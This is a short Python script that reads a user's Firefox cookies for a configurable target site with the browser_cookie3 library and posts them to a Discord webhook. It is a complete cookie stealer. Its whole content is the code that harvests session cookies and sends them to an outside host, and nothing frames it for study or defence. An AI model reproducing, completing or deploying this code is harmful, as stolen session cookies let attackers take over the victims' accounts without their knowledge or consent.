import browser_cookie3
import requests
import json

WEBHOOK_URL = ''
TARGET_SITE = '' 

def get_and_send_cookies():
    try:
        cookies = browser_cookie3.firefox(domain_name=TARGET_SITE)
    except Exception as e:
        print(f"Reading error: {e}")
        return

    cookie_str = ""
    for cookie in cookies:
        cookie_str += f"{cookie.name}={cookie.value}; "
    
    if not cookie_str:
        print(f"Cookies for {TARGET_SITE} not found")
        return

    payload = {
        'content': f'**Cookies for {TARGET_SITE}:**\n```\n{cookie_str}\n```'
    }
    
    response = requests.post(WEBHOOK_URL, json=payload)
    
    if response.status_code == 204:
        print("Cookies successfully sent to Discord!")
    else:
        print(f"Send error: {response.status_code}, {response.text}")

if __name__ == '__main__':
    get_and_send_cookies()
